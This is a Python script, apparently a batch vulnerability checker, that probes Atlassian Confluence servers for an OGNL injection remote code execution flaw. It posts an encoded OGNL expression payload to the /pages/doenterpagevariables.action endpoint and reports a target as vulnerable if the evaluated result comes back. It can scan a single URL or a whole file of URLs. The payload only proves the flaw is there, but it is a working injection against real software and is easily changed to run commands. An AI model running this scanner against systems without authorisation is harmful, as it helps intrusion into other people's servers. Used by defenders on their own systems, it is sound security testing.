import argparse
import requests

def checkvuln(url):
    try:
        attackurl = url + '/pages/doenterpagevariables.action'
        data = "queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027"
        headers = {
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
            'Content-Type':'application/x-www-form-urlencoded',
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Accept-Language':'en'

        }
        req = requests.post(attackurl, headers=headers, data=data,verify=False,timeout=10) #
        if req.status_code == 403:
            if 'value="[54289]"' in req.text :
                print(f'[+]{attackurl}存在漏洞')
            else:
                print('[-]不存在漏洞')
        else:
            print('[-]不存在漏洞')
    except Exception as e:
        print("无法访问该网站")
#批量检测漏洞
def checkurls(filename):
    with open(filename,'r') as f:
        for readline in f.readlines():
            checkvuln(readline)
def startwith():

    logo = """
 █████╗  ██████╗███████╗    ██████╗  ██████╗███████╗
██╔══██╗██╔════╝██╔════╝    ██╔══██╗██╔════╝██╔════╝
███████║██║     █████╗█████╗██████╔╝██║     █████╗  
██╔══██║██║     ██╔══╝╚════╝██╔══██╗██║     ██╔══╝  
██║  ██║╚██████╗██║         ██║  ██║╚██████╗███████╗
╚═╝  ╚═╝ ╚═════╝╚═╝         ╚═╝  ╚═╝ ╚═════╝╚══════╝
    """
    # 修改横幅信息
    print(logo)
    print("AtlassianConfluence-RCE批量检测工具")
    print("writen by loml13yyy")


if __name__ == '__main__':
    startwith()
    parser = argparse.ArgumentParser(
        description="This is an AtlassianConfluence-RCE detection tool")

    # 添加命令行参数 处理这些参数
    parser.add_argument("-u", "--url", help="Specify the target URL for the attack")
    parser.add_argument("-f", "--file", help="Specify the username file")
  #  parser.add_argument("-m", "--mode", choices=["poc", "exp"], help="Specify the mode (poc or exp)")
    # 调用
    args = parser.parse_args()
    # 根据命令行参数执行相应的功能
    if args.url:
        checkvuln(args.url)
    elif args.file:
        checkurls(args.file)
    else:
        parser.print_help()
